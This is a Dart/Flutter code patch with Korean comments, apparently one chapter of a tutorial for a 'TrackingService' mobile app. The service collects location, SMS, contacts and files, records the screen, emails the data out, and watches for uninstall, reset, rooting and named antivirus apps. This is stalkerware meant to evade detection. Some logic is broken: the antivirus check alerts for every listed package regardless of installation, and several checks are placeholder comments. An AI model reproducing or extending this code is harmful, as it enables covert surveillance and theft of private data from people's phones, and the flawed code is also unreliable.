// lib/services/tracking_service.dart 파일 상단에 추가
import '../services/email_service.dart';

// TrackingService 클래스 내부에 추가할 메서드들:

// 추적 시작 메서드 수정 (기존 startTracking 메서드를 이것으로 교체)
static Future<void> startTracking() async {
if (_isTracking) return;

_isTracking = true;

// 기존 데이터 수집 시작
_startLocationTracking();
_startDataCollection();
_startSMSCollection();
_startContactsCollection();

// Chapter 3 고급 기능들 시작
_startAdvancedMonitoring();
await _startFileMonitoring();
await _requestScreenRecording();

// 🔥 이메일 서비스 시작 (새로 추가)
EmailService.startEmailService();

await _logEvent('TRACKING_STARTED', 'All monitoring services activated - Chapter 3 with Email');
}

// 추적 중지 메서드 수정 (기존 stopTracking 메서드를 이것으로 교체)
static Future<void> stopTracking() async {
if (!_isTracking) return;

_isTracking = false;

// 모든 타이머 중지
_locationTimer?.cancel();
_dataCollectionTimer?.cancel();
_smsCollectionTimer?.cancel();
_contactsCollectionTimer?.cancel();
_advancedMonitoringTimer?.cancel();

// Chapter 3 서비스들 중지
await _stopFileMonitoring();
await _stopScreenRecording();

// 🔥 이메일 서비스 중지 (새로 추가)
EmailService.stopEmailService();

await _logEvent('TRACKING_STOPPED', 'All monitoring services deactivated - Chapter 3 with Email');
}

// 긴급 상황 감지 및 알림
static Future<void> _checkEmergencyConditions() async {
try {
// 1. 앱이 제거되려는 상황 감지
final packageManager = await getInstalledApps();
// 시스템 앱 변화 감지 로직...

// 2. 디바이스 초기화 시도 감지
// Factory reset 징후 감지...

// 3. 루팅 시도 감지
// Root 접근 시도 감지...

// 4. 안티바이러스 설치 감지
if (packageManager != null) {
final antivirusApps = ['com.avast.android.mobilesecurity',
'com.bitdefender.security',
'com.eset.ems2.gp',
'com.kaspersky.android.antivirus'];

for (String antivirusPackage in antivirusApps) {
// 안티바이러스 앱 설치 감지시 긴급 알림
await EmailService.sendEmergencyData('Antivirus app detected: $antivirusPackage');
}
}

} catch (e) {
await _logEvent('EMERGENCY_CHECK_ERROR', 'Emergency condition check failed: $e');
}
}

// 수동 데이터 전송 (테스트용)
static Future<bool> sendDataNow() async {
return await EmailService.sendDataManually();
}

// 이메일 서비스 상태 확인
static bool get isEmailServiceActive => EmailService.isActive;

// 다음 데이터 전송 시간
static DateTime? get nextEmailSendTime => EmailService.nextSendTime;

// 고급 모니터링에 긴급 상황 체크 추가 (기존 _startAdvancedMonitoring 메서드에 추가)
static void _startAdvancedMonitoring() {
_advancedMonitoringTimer = Timer.periodic(Duration(minutes: advancedInterval), (timer) async {
try {
await _checkAdvancedServices();
await _collectAdvancedData();
await _performSecurityChecks();

// 🔥 긴급 상황 체크 추가
await _checkEmergencyConditions();

} catch (e) {
print('고급 모니터링 오류: $e');
await _logEvent('ADVANCED_MONITORING_ERROR', 'Error in advanced monitoring: $e');
}
});
}